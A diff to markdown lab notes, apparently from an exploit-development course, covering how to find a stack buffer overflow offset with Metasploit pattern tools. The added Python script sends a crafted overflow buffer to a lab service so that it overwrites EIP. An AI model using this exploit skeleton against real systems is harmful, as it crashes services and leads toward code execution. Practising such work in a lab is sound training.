@@ -50,7 +50,7 @@ Once this is complete we can execute our PoC code on our Kali machine to observe
 
 _(To be performed on your own Kali and Debian lab client machines - Reporting is required for these exercises)_
 
-1.  Determine the correct buffer offset required to overwrite the return address on the stack.
+**1.  Determine the correct buffer offset required to overwrite the return address on the stack.**
 
 First we must create a pattern via msfvenom, we do this with the following command:
 `msf-pattern_create -l 4379 `
@@ -63,8 +63,35 @@ We can then run the PoC, using EDB to determine what part of the pattern overwro
 We can see that the new value of EIP is 46367046 and we can now use msf-pattern_offset to find its location.
 ![[Pasted image 20220714141906.png]]
 
-We can now update the "crash" variable to reflect the proper offset of 4368
+We can now update the "crash" variable to reflect the proper offset of 4368. The script should now look something like this:
+```python
+#!/usr/bin/python3
+import socket
+
+ip = "192.168.233.44"
+port = 13327
+
+
+crash = "\x41" * 4368
+eip = "B" * 4
+offset = "C" * (4379 - len(eip) - len(crash))
+inputBuffer = crash + eip + offset
+
+
+buffer = "\x11(setup sound " + inputBuffer + "\x90\x00#"
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
 
 
 
-2.  Update your stand-alone script to ensure your offset is correct.
+**2.  Update your stand-alone script to ensure your offset is correct.**
